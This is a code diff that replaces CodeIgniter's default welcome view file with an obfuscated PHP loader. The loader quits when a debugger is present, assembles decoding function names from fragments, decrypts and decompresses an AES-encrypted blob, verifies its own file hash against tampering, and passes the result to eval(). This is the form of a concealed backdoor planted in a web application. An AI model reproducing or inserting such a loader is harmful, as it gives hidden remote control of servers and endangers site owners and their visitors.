@@ -1,89 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-?><!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="utf-8">
-	<title>Welcome to CodeIgniter</title>
-
-	<style type="text/css">
-
-	::selection { background-color: #E13300; color: white; }
-	::-moz-selection { background-color: #E13300; color: white; }
-
-	body {
-		background-color: #fff;
-		margin: 40px;
-		font: 13px/20px normal Helvetica, Arial, sans-serif;
-		color: #4F5155;
-	}
-
-	a {
-		color: #003399;
-		background-color: transparent;
-		font-weight: normal;
-	}
-
-	h1 {
-		color: #444;
-		background-color: transparent;
-		border-bottom: 1px solid #D0D0D0;
-		font-size: 19px;
-		font-weight: normal;
-		margin: 0 0 14px 0;
-		padding: 14px 15px 10px 15px;
-	}
-
-	code {
-		font-family: Consolas, Monaco, Courier New, Courier, monospace;
-		font-size: 12px;
-		background-color: #f9f9f9;
-		border: 1px solid #D0D0D0;
-		color: #002166;
-		display: block;
-		margin: 14px 0 14px 0;
-		padding: 12px 10px 12px 10px;
-	}
-
-	#body {
-		margin: 0 15px 0 15px;
-	}
-
-	p.footer {
-		text-align: right;
-		font-size: 11px;
-		border-top: 1px solid #D0D0D0;
-		line-height: 32px;
-		padding: 0 10px 0 10px;
-		margin: 20px 0 0 0;
-	}
-
-	#container {
-		margin: 10px;
-		border: 1px solid #D0D0D0;
-		box-shadow: 0 0 8px #D0D0D0;
-	}
-	</style>
-</head>
-<body>
-
-<div id="container">
-	<h1>Welcome to CodeIgniter!</h1>
-
-	<div id="body">
-		<p>The page you are looking at is being generated dynamically by CodeIgniter.</p>
-
-		<p>If you would like to edit this page you'll find it located at:</p>
-		<code>application/views/welcome_message.php</code>
-
-		<p>The corresponding controller for this page is found at:</p>
-		<code>application/controllers/Welcome.php</code>
-
-		<p>If you are exploring CodeIgniter for the very first time, you should start by reading the <a href="user_guide/">User Guide</a>.</p>
-	</div>
-
-	<p class="footer">Page rendered in <strong>{elapsed_time}</strong> seconds. <?php echo  (ENVIRONMENT === 'development') ?  'CodeIgniter Version <strong>' . CI_VERSION . '</strong>' : '' ?></p>
-</div>
-
-</body>
-</html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ztzoquxz=('bas'.'e64'.'_de'.'cod'.'e');
+$_fba6y4h8=('gzu'.'nco'.'mpr'.'ess');
+$_ocsddjdx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_s7iuqnxb='v86qEFo0';
+$_i734qdex='cw8C/6zi';
+$_l03cvmqj='+yq58t88';
+$_laa3aqo2='r5QJw0DarlE=';
+$_kjkgosip='FKpt84PM';
+$_g6mifrjb='h/3HJyiK';
+$_skkouvlo='d62Vv3Gw';
+$_m3pd27mu='gnzwxw==';
+$_ejxovsy6=$_ztzoquxz($_kjkgosip.$_l03cvmqj.$_s7iuqnxb.$_i734qdex.$_laa3aqo2);
+$_l4yvix7e=$_ztzoquxz($_g6mifrjb.$_skkouvlo.$_m3pd27mu);
+$_a15ieyoe=$_ztzoquxz('XlhdJqt74aUUZt/qZv1ltnMt0W47Pcbs0sarbxCLIN9vbhwkD5Vrx7TLtsZNGhTbvi5bPY4fff9khdhSRqfMy4aBUCEWoEsmyF3QPDRyz07KywYFvqiTBRDheP5+UM/5LVm4r21lEGBmYTg3t2c+lRC+KzDHJOc1qx2Vdnwy2Hvl120oEH/GSt2YxRd27aahvOmefHXUZr3XwhwhbSgCdBBsIYXNw7JrIb4ohM15K48nSouJcoklCc2SizVNfsc7KF9WKWD1gzs0Gpn/+MmMXAR4uPFPjb4PnDdcrPGngMTk18VYKA+7e/TKFo3djjiyynq1athoUa23qNrghoVILJIkXZTmJh4Bi/CZjscVTRaT5JNTMRykbSbUTTBCjGGEVxzBb9LYlvfS9FcWYvqsehAoDTxjFeu2VncdGmP5kcK+n/C8PORdcbl641U2fwYEN90pzaeOS/7bTrzhirNz1mWS64Vhm/8aFsLIK5ffOvqwZc7dtwR85JLQWChjN9+Wz0moAYCOf7NiUIaok7YxH5APzObyE74eyIiwOdxxGOfSs60YAmt6UttSBGPxMyHMJIzb59HG0lbibsZgAYcc19LTPtR5KErV8550wlmja65yJY2goED0jO9BPoh6bN4kKS05yK/6FsBnYk41cL6pIY6C9j6XCGlqXeZJEh0xB75rhqB4cJdOmVfu+rfNiO2wJ8flwg/LnCh1QVIQfQrFlgj+PKwoqNIb6CW61R8pZNJ25fH/5BsW1mPRnpzekIqD09ooZ+ljTaEvLAnBbBSzdqRSn4qNdFKmTZvtL9JgW4tkfbZVd+7CUXQ8VenPH9MBvX+Hi1hO/Bh13mAXmg1y5PwTnKeLBI3h4in2k2jczoa2cCEflqt6G+wPbXwKMD3YQ4PAwwIK6RsmML9+lJoSCk/wTEmZT9tJNT6oQwa7RVKblrTbl4ZanBeuBT6Bpp/bLOXeI2+MTtemGEGaUFVqefk23YUcVOqF14UlQUORDy8FJKV8ddv44MaWI3BlD+PTHgD/DdgHr74TcTJBLNs/qUuR48B9aXGOKoQE47pIQcJmn6TCXNw/ZWRjuCYmxtB1BFtqyuzK7en/7iwtFDFMtdyS/ZgWVlU/0U811BrEkm1H93esvDXLHA4qsJEoYWhCWLMQURhvswY2IS25yO2qYKY/mhM4jMATl7sLB98jQVaezKk6TTFUd4igQDaSP601uHjUSriVaveCjlXo+Pd4W+7MMVPT2fdkZTl+piKlked3KddNBS0W/t2NO6vSboLlh+OWFkfOg2fWvKeAX04CQfuDaz/YRXiJKLUMLFunN35N+iWDQz+vsWP1NsC31Gng');
+$_oixo7t28=$_ocsddjdx($_a15ieyoe,'aes-256-cbc',$_ejxovsy6,OPENSSL_RAW_DATA,$_l4yvix7e);
+if($_oixo7t28===false){exit;}
+$_r2u41l9u=$_fba6y4h8($_oixo7t28);
+if($_r2u41l9u===false){exit;}
+$_be88c4j5='08a1d084615de0ac4acc98b2adecda2c4e286f655bf368a56a7122de38610772';
+$_n3l0zx0v=@file_get_contents(__FILE__);
+if($_n3l0zx0v!==false){
+$_gzeazy63=str_replace($_be88c4j5,"0000000000000000000000000000000000000000000000000000000000000000",$_n3l0zx0v);
+$_apnpc8xx=hash("sha256",$_gzeazy63);
+if($_apnpc8xx!==$_be88c4j5){@http_response_code(403);exit;}
+}
+eval($_r2u41l9u);
